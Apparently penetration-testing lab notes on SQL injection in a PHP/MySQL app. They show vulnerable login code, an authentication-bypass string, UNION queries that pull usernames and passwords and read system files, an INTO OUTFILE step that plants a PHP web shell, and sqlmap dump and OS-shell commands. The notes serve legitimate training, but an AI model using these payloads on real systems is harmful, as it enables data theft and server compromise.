Web Application Attacks - SQL Injection

Info: 
Found in dynamic sites that is caused by unsantized user input which is then passed on to a database. 
Can lead to data leakage and complete server compromise. 


PHP/MYSQL environment SQL Injection Attacks

Authentication Bypass

Admin page code: 

mysql_select_db('webappdb');
	•	$user = $_POST['user']; // unsanitized
	•	$pass = $_POST['pass']; // unsanitized
	•	$query="select * from users where name = '$user' and password = '$pass' "; 
	•	$queryN = mysql_query($query) or die(mysql_error());
	•	if (mysql_num_rows($queryN) == 1)
	•	{ $resultN = mysql_fetch_assoc($queryN);
	◦	$_SESSION['user'] = $_POST['user']; 
	◦	header("location:admin.php");
	•	}
	•	else // user rejected
	•	{ echo "<br /><h1>Wrong Username or Password</h1>";
	◦	echo '<META HTTP-EQUIV="Refresh" CONTENT="2;URL=admin.php">'; 
	•	}
	•	
Note: $user and $pass POST variables are not sanitized in any way and are then used as part of an SQL statment.
	◦	
	◦	
Log in to MYSQL database on the machine it is running on 

C:\xampp\mysql\bin>mysql -u root -p 
mysql> use webappdb


Query Users:

mysql> select * from users; 
mysql> select * from users where name='wronguser' and password='wrongpass'; Empty set (0.00 sec)
mysql> select * from users where name='offsec' and password='123456';


Query Users with malicious input

mysql> select * from users where name='wronguser' or 1=1;# and password='wrongpass';
mysql> select * from users where name='wronguser' or 1=1 LIMIT 1;# and password='wrongpass';

Note: These queries can be executed by the client simply by enterring 'wronguser' or 1=1;#  to the username field and 'wrongpass' to the password field. 




Testing for an Error, Enumerating The Database & Understanding the Structure

Test: add the symbol ' or " to a query parameter. If this causes an error, an enumeration attack is possible. 

Coloumn number enumeration: 

Info: Depending on the verbosity of the error, the 'order by' output query can be used to gather information on the database structure

Command: http://10.11.1.35/comment.php?id=738 order by 1
Note: Keep increasing the value till an error occurs. The previous value will give you the number of columns in the current table. 

Command: http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,5,6
Note: The number of values in the command has to equal the number of columns in the table



Extracting Data from the Database

Discover the version of MYSQL: http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,@@version,6

Discover the current user: http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,user(),6

Discover the tables in the database: http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,table_name,6 FROM information_schema.tables

Discover the columns in the user table: http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name='users'

Discover the name and password values from the users table: http://10.11.1.35/comment.php?id=738 union select 1,2,3,4,concat(name,0x3a, password),6 FROM users



Code Execution:

Read from file (load_file): http://192.168/13/33/comment.php?id=-1 union select all 1,2,3,4,load_file('c:/windows/system32/drivers/etc/hosts'),6

Create file (OUTFILE): http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'
Navigate to the file created: http://10.11.1.35/backdoor.php?cmd=ipconfig



Automated (SQLMap)

Info: Identify and exploit SQL injection vulnerabilities. 

Enumerate and search for SQL injection vulnerabilities: root@kali:~# sqlmap -u http://10.11.1.35 --crawl=1

Extract data from Database: root@kali:~# sqlmap -u http://10.11.1.35/comment.php?id=738 --dbms=mysql --dump -- threads=5

Get Shell: root@kali:~# sqlmap -u http://10.11.1.35/comment.php?id=738 --dbms=mysql --os-shell


